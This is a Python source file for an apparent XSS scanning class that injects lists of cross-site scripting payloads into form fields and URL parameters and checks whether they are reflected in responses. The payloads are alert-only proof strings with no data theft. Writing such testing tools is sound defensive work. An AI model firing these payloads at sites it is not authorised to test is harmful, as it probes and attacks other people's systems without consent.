import requests
from urllib.parse import urljoin, urlparse, parse_qs
import re
from bs4 import BeautifulSoup
import time
import random
import string

class XSSTester:
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        self.setup_session()
        
        # XSS payloads for different contexts
        self.payloads = {
            'reflected': [
                '<script>alert("XSS")</script>',
                '"><script>alert("XSS")</script>',
                "'><script>alert('XSS')</script>",
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                'javascript:alert("XSS")',
                '<iframe src="javascript:alert(\'XSS\')">',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus>',
                '<textarea onfocus=alert("XSS") autofocus>',
                '<keygen onfocus=alert("XSS") autofocus>',
                '<video><source onerror="alert(\'XSS\')">',
                '<audio src=x onerror=alert("XSS")>',
                '<details open ontoggle=alert("XSS")>',
                '<marquee onstart=alert("XSS")>',
            ],
            'stored': [
                '<script>alert("Stored XSS")</script>',
                '<img src=x onerror=alert("Stored XSS")>',
                '<svg onload=alert("Stored XSS")>',
                '<iframe src="javascript:alert(\'Stored XSS\')">',
            ],
            'dom': [
                '#<script>alert("DOM XSS")</script>',
                'javascript:alert("DOM XSS")',
                '<img src=x onerror=alert("DOM XSS")>',
            ]
        }
        
        # Context-specific payloads
        self.context_payloads = {
            'attribute': [
                '" onmouseover="alert(\'XSS\')" "',
                '\' onmouseover=\'alert("XSS")\' \'',
                '"><script>alert("XSS")</script>',
            ],
            'javascript': [
                '\';alert("XSS");//',
                '\";alert(\"XSS\");//',
                '</script><script>alert("XSS")</script>',
            ],
            'css': [
                '</style><script>alert("XSS")</script>',
                'expression(alert("XSS"))',
                'javascript:alert("XSS")',
            ]
        }
    
    def setup_session(self):
        """Setup session with cookies and headers"""
        if self.config.cookies:
            cookie_dict = {}
            for cookie in self.config.cookies.split(';'):
                if '=' in cookie:
                    name, value = cookie.strip().split('=', 1)
                    cookie_dict[name] = value
            self.session.cookies.update(cookie_dict)
        
        if self.config.headers:
            for header in self.config.headers.split(','):
                if ':' in header:
                    name, value = header.strip().split(':', 1)
                    self.session.headers[name] = value.strip()
    
    def generate_unique_payload(self, base_payload):
        """Generate unique payload to avoid false positives"""
        unique_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        return base_payload.replace('XSS', f'XSS_{unique_id}'), unique_id
    
    def test_endpoints(self, endpoints):
        """Test all endpoints for XSS vulnerabilities"""
        results = []
        
        for endpoint in endpoints:
            if endpoint['type'] == 'form':
                results.extend(self.test_form_xss(endpoint))
            elif endpoint['type'] == 'url':
                results.extend(self.test_url_xss(endpoint))
        
        return results
    
    def test_form_xss(self, endpoint):
        """Test form inputs for XSS vulnerabilities"""
        results = []
        url = endpoint['url']
        method = endpoint.get('method', 'GET').upper()
        inputs = endpoint.get('inputs', [])
        
        for input_field in inputs:
            field_name = input_field.get('name')
            field_type = input_field.get('type', 'text')
            
            if not field_name or field_type in ['submit', 'button', 'hidden']:
                continue
            
            # Test different payload types
            for payload_type, payloads in self.payloads.items():
                for payload in payloads:
                    unique_payload, unique_id = self.generate_unique_payload(payload)
                    
                    # Prepare form data
                    form_data = {field_name: unique_payload}
                    
                    # Add other required fields with dummy data
                    for other_input in inputs:
                        other_name = other_input.get('name')
                        if other_name and other_name != field_name:
                            form_data[other_name] = 'test_value'
                    
                    try:
                        if method == 'POST':
                            response = self.session.post(url, data=form_data, timeout=10)
                        else:
                            response = self.session.get(url, params=form_data, timeout=10)
                        
                        # Check for XSS in response
                        vulnerability = self.analyze_response(response, unique_payload, unique_id)
                        if vulnerability:
                            vulnerability.update({
                                'endpoint': url,
                                'method': method,
                                'parameter': field_name,
                                'payload_type': payload_type,
                                'payload': unique_payload
                            })
                            results.append(vulnerability)
                    
                    except requests.RequestException as e:
                        continue
                    
                    # Rate limiting
                    time.sleep(0.1)
        
        return results
    
    def test_url_xss(self, endpoint):
        """Test URL parameters for XSS vulnerabilities"""
        results = []
        url = endpoint['url']
        
        # Parse URL parameters
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        for param_name, param_values in params.items():
            for payload_type, payloads in self.payloads.items():
                for payload in payloads:
                    unique_payload, unique_id = self.generate_unique_payload(payload)
                    
                    # Create test parameters
                    test_params = params.copy()
                    test_params[param_name] = [unique_payload]
                    
                    try:
                        response = self.session.get(
                            f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}",
                            params=test_params,
                            timeout=10
                        )
                        
                        # Check for XSS in response
                        vulnerability = self.analyze_response(response, unique_payload, unique_id)
                        if vulnerability:
                            vulnerability.update({
                                'endpoint': url,
                                'method': 'GET',
                                'parameter': param_name,
                                'payload_type': payload_type,
                                'payload': unique_payload
                            })
                            results.append(vulnerability)
                    
                    except requests.RequestException as e:
                        continue
                    
                    # Rate limiting
                    time.sleep(0.1)
        
        return results
    
    def analyze_response(self, response, payload, unique_id):
        """Analyze response for XSS vulnerabilities"""
        content = response.text.lower()
        payload_lower = payload.lower()
        
        # Check if payload is reflected in response
        if unique_id.lower() in content:
            # Determine XSS context and severity
            context = self.determine_context(response.text, payload)
            severity = self.calculate_severity(context, payload)
            
            return {
                'type': 'XSS',
                'severity': severity,
                'context': context,
                'description': f'XSS vulnerability found - payload reflected in {context} context',
                'response_snippet': self.extract_snippet(response.text, unique_id)
            }
        
        return None
    
    def determine_context(self, response_text, payload):
        """Determine the context where XSS payload appears"""
        soup = BeautifulSoup(response_text, 'html.parser')
        
        # Check for script context
        if '<script' in response_text.lower() and payload.lower() in response_text.lower():
            return 'javascript'
        
        # Check for attribute context
        if re.search(r'<[^>]*' + re.escape(payload) + r'[^>]*>', response_text, re.IGNORECASE):
            return 'attribute'
        
        # Check for CSS context
        if '<style' in response_text.lower() and payload.lower() in response_text.lower():
            return 'css'
        
        # Default to HTML context
        return 'html'
    
    def calculate_severity(self, context, payload):
        """Calculate vulnerability severity"""
        if '<script>' in payload.lower() or 'javascript:' in payload.lower():
            return 'High'
        elif context == 'attribute' and ('on' in payload.lower()):
            return 'High'
        elif context == 'html':
            return 'Medium'
        else:
            return 'Low'
    
    def extract_snippet(self, response_text, unique_id):
        """Extract relevant snippet from response"""
        lines = response_text.split('\n')
        for i, line in enumerate(lines):
            if unique_id in line:
                start = max(0, i - 2)
                end = min(len(lines), i + 3)
                return '\n'.join(lines[start:end])
        return "Snippet not found"